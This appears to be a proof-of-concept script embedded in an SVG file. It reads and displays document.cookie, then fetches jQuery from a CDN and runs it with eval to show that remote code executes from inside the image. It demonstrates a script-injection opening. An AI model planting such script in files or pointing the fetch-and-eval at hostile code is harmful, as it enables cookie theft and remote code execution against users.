svg.script:
const url = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js?utm_source=chatgpt.com';
const status = document.getElementById('status');
const details = document.getElementById('details');
const indicatorText = document.getElementById('indicator-text');

(async () => {
  let cookieResult;
  try {
    cookieResult = `document.cookie: ${document.cookie || '(empty)'}`;
  } catch (error) {
    cookieResult = `document.cookie blocked: ${error.name}`;
  }
  details.textContent = cookieResult;

  try {
    const response = await fetch(url);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const source = await response.text();

    (0, eval)(source);
    if (!window.jQuery) throw new Error('jQuery was not installed');

    const $ = window.jQuery;
    $('#status').text(`jQuery ${$.fn.jquery} loaded and executed`);
    $('#indicator').attr({ fill: '#16a34a', opacity: '1' });
    $('#details').attr('fill', '#eaffea');

    // Reveal or hide one character per frame, 20 frames/second.
    const sentence = 'jQuery animation running..........';
    const text = $('#indicator-text');
    const minChars = 1;
    const maxChars = sentence.length;
    let chars = maxChars;
    let direction = -1;

    text.text(sentence);
    setInterval(() => {
      chars += direction;
      if (chars <= minChars) {
        chars = minChars;
        direction = 1;
      } else if (chars >= maxChars) {
        chars = maxChars;
        direction = -1;
      }
      text.text(sentence.slice(0, chars));
    }, 50);
  } catch (error) {
    status.textContent = `PoC failed: ${error.message}`;
    indicatorText.textContent = 'Fetch / execution failed';
    document.getElementById('indicator').setAttribute('fill', '#b91c1c');
    document.getElementById('indicator').setAttribute('opacity', '1');
  }
})();
